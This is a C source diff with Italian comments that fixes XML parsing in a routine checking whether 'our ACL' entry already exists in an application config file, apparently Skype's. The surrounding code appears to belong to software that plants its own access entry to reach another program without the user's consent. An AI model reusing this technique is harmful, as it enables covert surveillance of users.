@@ -1912,16 +1912,20 @@ BOOL IsSkypePMInstalled()
 	return FALSE;
 }
 
-#define GENERIC_FIELD_LEN 256
+#define GENERIC_FIELD_LEN MAX_PATH*2
+// Usabile solo in questo caso, perche' potrebbe tornare dei campi inesistenti
+// ma tanto al fine dei nostri check poco ci interessa leggere dei campi in piu' 
+// con valori NULL
 char *GetXMLNodeA(char *data, char *node, char *buffer)
 {
-	char *ptr1, *ptr2;
+	char *ptr1, *ptr2, *ret_val;
 	char saved_char;
 	memset(buffer, 0, GENERIC_FIELD_LEN);
 	if (data == NULL)
 		return NULL;
 	if ( !(ptr1 = strstr(data, node)) )
 		return NULL;
+	ret_val = ptr1;
 	if ( !(ptr1 = strchr(ptr1, L'>')) )
 		return NULL;
 	if ( !(ptr2 = strchr(ptr1, L'<')) )
@@ -1930,7 +1934,7 @@ char *GetXMLNodeA(char *data, char *node, char *buffer)
 	ptr1++; *ptr2 = 0;
 	strncpy_s(buffer, GENERIC_FIELD_LEN, ptr1, _TRUNCATE);
 	*ptr2 = saved_char;
-	return ptr2;	
+	return ret_val;	
 }
 
 // Verifica se l'ACL nel file corrisponde alla nostra
@@ -1942,36 +1946,37 @@ BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *
 }
 
 // Verifica se nel file di config c'e' la nostra ACL
+// Se non riesce ad aprire il file, torna che l'acl c'e'. Altrimenti potrebbe scriverla piu' volte...tanto poi non riuscirebbe comunque a scriverla
 BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
 {
 	HANDLE hFile;
 	HANDLE hMap;
 	DWORD config_size;
 	char *config_map;
-	char *local_config_map, *ptr;
+	char *local_config_map, *ptr, *ptr_k;
 	BOOL acl_found = FALSE;
 	char key1[GENERIC_FIELD_LEN], key2[GENERIC_FIELD_LEN], key3[GENERIC_FIELD_LEN], key4[GENERIC_FIELD_LEN], path[GENERIC_FIELD_LEN];
 
 	// Mappa in memoria il file di config
 	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
-		return FALSE;
+		return TRUE;
 	
 	config_size = GetFileSize(hFile, NULL);
 	if (config_size == INVALID_FILE_SIZE) {
 		CloseHandle(hFile);
-		return FALSE;
+		return TRUE;
 	}
 	
 	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
 	if (local_config_map == NULL) {
 		CloseHandle(hFile);
-		return FALSE;
+		return TRUE;
 	}
 
 	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
 		SAFE_FREE(local_config_map);
 		CloseHandle(hFile);
-		return FALSE;
+		return TRUE;
 	}
 
 	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
@@ -1980,14 +1985,17 @@ BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, 
 		ptr = local_config_map;
 		// Vede se ce una chiave che matcha
 		while (ptr = GetXMLNodeA(ptr, "Key1", key1)) {
-			ptr = GetXMLNodeA(ptr, "Key2", key2);
-			ptr = GetXMLNodeA(ptr, "Key3", key3);
-			ptr = GetXMLNodeA(ptr, "Key4", key4);
-			ptr = GetXMLNodeA(ptr, "Path", path);
+			ptr_k = GetXMLNodeA(ptr, "Key2", key2);
+			ptr_k = GetXMLNodeA(ptr_k, "Key3", key3);
+			ptr_k = GetXMLNodeA(ptr_k, "Key4", key4);
+			ptr_k = GetXMLNodeA(ptr_k, "Path", path);
+			if (!ptr_k)
+				break; // Se non ci sono piu' nemmeno un Key2,3,4 e Path e' inutile continuare a cercare
 			if (CheckACL(key1, key2, key3, key4, path, m_key1, m_key2, m_key3, m_key4, m_path)) {
 				acl_found = TRUE;
 				break;
 			}
+			ptr++;
 		}
 	}
 	SAFE_FREE(local_config_map);
